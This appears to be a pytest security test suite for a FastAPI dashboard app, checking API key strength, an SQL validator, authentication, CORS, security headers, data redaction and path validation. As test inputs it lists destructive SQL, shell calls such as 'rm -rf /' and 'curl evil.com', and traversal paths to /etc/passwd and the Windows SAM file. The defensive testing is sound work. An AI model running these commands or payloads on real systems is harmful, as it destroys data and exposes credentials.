"""
Security test suite to validate security fixes.
"""

import pytest
import os
import tempfile
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock

# Import the components to test
from auth import SecurityConfig, verify_api_key
from sql_validator import SQLValidator, ValidationError
from main import app


class TestSecurityFixes:
    """Test suite for security fixes."""
    
    def test_api_key_validation(self):
        """Test that API key validation works correctly."""
        
        # Test that weak keys are rejected
        with patch.dict(os.environ, {"DASHLY_API_KEY": "weak", "REQUIRE_AUTH": "true"}):
            with pytest.raises(ValueError, match="at least 16 characters"):
                SecurityConfig.validate_config()
        
        # Test that default keys are rejected
        with patch.dict(os.environ, {"DASHLY_API_KEY": "dashly-demo-key-2024", "REQUIRE_AUTH": "true"}):
            with pytest.raises(ValueError, match="Default or weak API key"):
                SecurityConfig.validate_config()
        
        # Test that missing key with auth required is rejected
        with patch.dict(os.environ, {"REQUIRE_AUTH": "true"}, clear=True):
            with pytest.raises(ValueError, match="must be set when authentication"):
                SecurityConfig.validate_config()
        
        # Test that valid key passes
        with patch.dict(os.environ, {"DASHLY_API_KEY": "secure-key-1234567890", "REQUIRE_AUTH": "true"}):
            SecurityConfig.validate_config()  # Should not raise
    
    def test_sql_validator_dangerous_keywords(self):
        """Test SQL validator blocks dangerous keywords."""
        validator = SQLValidator()
        
        dangerous_queries = [
            "DROP TABLE users",
            "DELETE FROM sales",
            "INSERT INTO users VALUES (1, 'hacker')",
            "UPDATE users SET password = 'hacked'",
            "CREATE TABLE malicious (id INT)",
            "ALTER TABLE users ADD COLUMN backdoor TEXT",
            "EXEC sp_configure",
            "CALL malicious_procedure()",
        ]
        
        for query in dangerous_queries:
            with pytest.raises(ValidationError):
                validator.validate_query(query)
    
    def test_sql_validator_dangerous_functions(self):
        """Test SQL validator blocks dangerous functions."""
        validator = SQLValidator()
        
        dangerous_queries = [
            "SELECT system('rm -rf /')",
            "SELECT read_file('/etc/passwd')",
            "SELECT load_extension('malicious.so')",
            "SELECT shell('curl evil.com')",
        ]
        
        for query in dangerous_queries:
            with pytest.raises(ValidationError):
                validator.validate_query(query)
    
    def test_sql_validator_allows_safe_queries(self):
        """Test SQL validator allows safe SELECT queries."""
        validator = SQLValidator()
        
        safe_queries = [
            "SELECT * FROM sales",
            "SELECT name, age FROM users WHERE age > 18",
            "SELECT COUNT(*) FROM orders GROUP BY region",
            "SELECT AVG(price) FROM products",
            "WITH monthly_sales AS (SELECT * FROM sales) SELECT * FROM monthly_sales",
        ]
        
        for query in safe_queries:
            # Should not raise an exception
            result = validator.validate_query(query)
            assert result.strip() == query.strip()
    
    def test_sql_validator_comment_removal(self):
        """Test that SQL comments are removed."""
        validator = SQLValidator()
        
        queries_with_comments = [
            "SELECT * FROM users -- WHERE 1=1; DROP TABLE users",
            "SELECT * FROM users /* malicious comment */ WHERE id = 1",
            "SELECT * FROM users # another comment",
        ]
        
        for query in queries_with_comments:
            result = validator.validate_query(query)
            assert "--" not in result
            assert "/*" not in result
            assert "#" not in result
    
    def test_authentication_endpoint_protection(self):
        """Test that endpoints are properly protected."""
        client = TestClient(app)
        
        # Test without authentication (should fail if auth is required)
        with patch.dict(os.environ, {"REQUIRE_AUTH": "true", "DASHLY_API_KEY": "test-key-1234567890"}):
            response = client.get("/api/tables")
            assert response.status_code == 401
            
            # Test with valid API key
            headers = {"Authorization": f"Bearer test-key-1234567890"}
            response = client.get("/api/tables", headers=headers)
            # Note: This might fail due to database not being set up, but auth should pass
            assert response.status_code != 401
    
    def test_cors_configuration(self):
        """Test CORS configuration."""
        client = TestClient(app)
        
        # Test preflight request
        response = client.options("/api/tables", headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "Authorization"
        })
        
        # Should have CORS headers
        assert "access-control-allow-origin" in response.headers
    
    def test_security_headers(self):
        """Test that security headers are present."""
        client = TestClient(app)
        
        response = client.get("/")
        
        # Check for security headers
        assert response.headers.get("X-Content-Type-Options") == "nosniff"
        assert response.headers.get("X-Frame-Options") == "DENY"
        assert response.headers.get("X-XSS-Protection") == "1; mode=block"
        assert "Content-Security-Policy" in response.headers
        assert "Permissions-Policy" in response.headers
    
    def test_data_sanitization(self):
        """Test that sensitive data is properly sanitized."""
        from database_manager import DatabaseManager
        
        # Mock sample data with sensitive information
        sample_data = [
            {
                "name": "John Doe",
                "email": "john@example.com",
                "phone": "555-1234",
                "password": "secret123",
                "salary": 50000,
                "age": 30
            }
        ]
        
        db_manager = DatabaseManager()
        sanitized = db_manager._sanitize_sample_data(sample_data)
        
        # Check that sensitive fields are redacted
        assert sanitized[0]["email"] == "[REDACTED]"
        assert sanitized[0]["phone"] == "[REDACTED]"
        assert sanitized[0]["password"] == "[REDACTED]"
        
        # Non-sensitive fields should remain
        assert sanitized[0]["name"] == "John Doe"
        assert sanitized[0]["age"] == 30
    
    def test_path_validation(self):
        """Test path validation prevents directory traversal."""
        from database_manager import DatabaseManager
        from exceptions import InvalidPathError
        
        db_manager = DatabaseManager()
        
        # Test directory traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        for path in malicious_paths:
            with pytest.raises(InvalidPathError):
                db_manager._validate_csv_path(path)


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v"])